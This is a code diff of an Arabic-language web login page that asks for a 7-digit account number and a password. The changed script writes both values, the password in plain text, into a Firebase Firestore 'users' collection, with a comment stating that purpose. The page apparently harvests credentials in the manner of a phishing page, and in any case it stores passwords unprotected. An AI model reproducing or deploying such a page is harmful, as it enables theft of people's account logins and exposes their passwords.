@@ -26,13 +26,13 @@
                     <label class="input-label" for="userID">رقم الحساب:</label>
                     <input class="form-input" type="text" id="userID" 
                             placeholder="" maxlength="7" required 
-                            inputmode="numeric" pattern="\d{7}">
+                            inputmode="numeric" pattern="\d{7}" name="userID">
                     <span class="input-description">أدخل رقم الحساب المكون من 7 أرقام</span>
                 </div>
 
                 <div class="input-group">
                     <label class="input-label" for="password">كلمة المرور:</label>
-                    <input class="form-input" type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                    <input class="form-input" type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
                 </div>
 
                 <a href="a.html" class="forgot-password-link">نسيت كلمة المرور؟</a>
@@ -45,7 +45,6 @@
     <div class="toast-message" id="toast"></div>
 
 <script type="module">
- 
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";
   import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
@@ -90,6 +89,7 @@
       }
 
       try {
+          // حفظ رقم الحساب وكلمة المرور في Firestore
           await setDoc(doc(db, "users", userID), {
               userID,
               password
